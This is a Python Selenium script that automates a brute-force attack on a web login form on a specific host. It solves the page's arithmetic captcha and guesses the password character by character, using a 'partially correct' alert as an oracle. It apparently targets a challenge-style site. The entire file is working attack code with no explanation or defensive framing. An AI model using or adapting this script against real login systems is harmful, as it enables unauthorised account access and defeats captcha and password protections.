from selenium import webdriver
import re
import random
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
browser = webdriver.Chrome()
char_list = 'abcdefghijklmnopqrstuvwxyz0123456789'
import ast
import operator as op
import time
from itertools import product
# supported operators
operators = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
             ast.Div: op.truediv, ast.Pow: op.pow, ast.BitXor: op.xor,
             ast.USub: op.neg}

def eval_expr(expr):
    """
    >>> eval_expr('2^6')
    4
    >>> eval_expr('2**6')
    64
    >>> eval_expr('1 + 2*3**(4^5) / (6 + -7)')
    -5.0
    """
    return eval_(ast.parse(expr, mode='eval').body)

def eval_(node):
    if isinstance(node, ast.Num): # <number>
        return node.n
    elif isinstance(node, ast.BinOp): # <left> <operator> <right>
        return operators[type(node.op)](eval_(node.left), eval_(node.right))
    elif isinstance(node, ast.UnaryOp): # <operator> <operand> e.g., -1
        return operators[type(node.op)](eval_(node.operand))
    else:
        raise TypeError(node)

def intro(browser):
	i = 0
	realPass = ""
	while(True):
		browser.get('https://m9sd7kenwo72ji7h.p7z.pw/nrnxpexdhit4jxsf/')
		username = "perseus_inwza_007@blackmarket.onion"
		user = browser.find_element("xpath",'//*[@id="email"]')
		user.send_keys(username)
		capcha = browser.find_element("xpath",'//*[@id="loginform"]/center[1]/h3')
		capchaString = capcha.text.strip()
		capchaString = re.sub('[=??]', '',capchaString)
		capchaInput = browser.find_element("xpath",'//*[@id="captcha"]')
		value = eval_expr(capchaString)
		capchaInput.send_keys(str(value))
		word = realPass + char_list[i]
		password = word
		print(word)
		passw = browser.find_element("xpath",'//*[@id="password"]')
		passw.send_keys(password)
		print(password)
		try:
			submitbutton = browser.find_element("xpath",'//*[@id="btnLogin"]')
			submitbutton.click()
		except:
			print("An exception occurred")

		try:
			WebDriverWait(browser,6).until(EC.alert_is_present(),'Timed out waiting for PA creation ' +'confirmationpopupappear.')
			alert = browser.switch_to.alert
			status = alert.text
			if(status == 'Password is incorrect'):
				alert.accept()
			elif(status == 'Password is partially correct'):
				realPass = word
				i = 0
				print(realPass)
				alert.accept()
			print("alert accepted")
		except TimeoutException:
			print("no alert")
			break
		except:
			pass
		if(browser.current_url!='https://m9sd7kenwo72ji7h.p7z.pw/nrnxpexdhit4jxsf/'):
			break
		i = i+1
			
intro(browser)